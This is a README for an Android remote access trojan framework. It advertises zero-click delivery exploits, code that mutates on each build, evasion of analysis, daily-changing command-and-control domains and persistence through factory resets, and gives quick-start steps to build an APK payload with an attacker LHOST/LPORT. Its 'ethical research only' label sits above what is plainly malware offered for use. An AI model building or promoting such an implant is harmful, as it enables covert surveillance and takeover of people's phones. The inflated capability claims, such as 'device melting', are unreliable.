# 🔥 Polymorphic Android RAT Framework  
*Zero-click persistent implant with genetic mutation capabilities*  
**WARNING: FOR ETHICAL RESEARCH ONLY. USE IN UNAUTHORIZED SYSTEMS IS ILLEGAL.**  

## ⚙️ Features  
- **Polymorphic Engine**: Code structure mutates on every build  
- **Zero-Click Delivery**: Bluetooth/WiFi/Samsung Cloud exploits  
- **Anti-Forensics**: VM detection + device melting when analyzed  
- **Domain Generation**: Daily-changing C2 domains  
- **Persistent**: Survives factory resets via kernel injection  

## 🚀 Quick Start  
### Prerequisites  
- Kali Linux 2025+  
- Metasploit Framework  
- Android SDK (API 34)  
- `apksigner`, `lz4`, `upx`  

### Building a Polymorphic RAT  
```bash 
# Clone repository  
git clone https://github.com/<your-username>/Polymorphic-Android-RAT  
cd Polymorphic-Android-RAT  

# Generate payload (modify LHOST/LPORT in build_poly_rat.py)  
python build_poly_rat.py  

# Output: ./samples/poly_rat_<HASH>.apk  
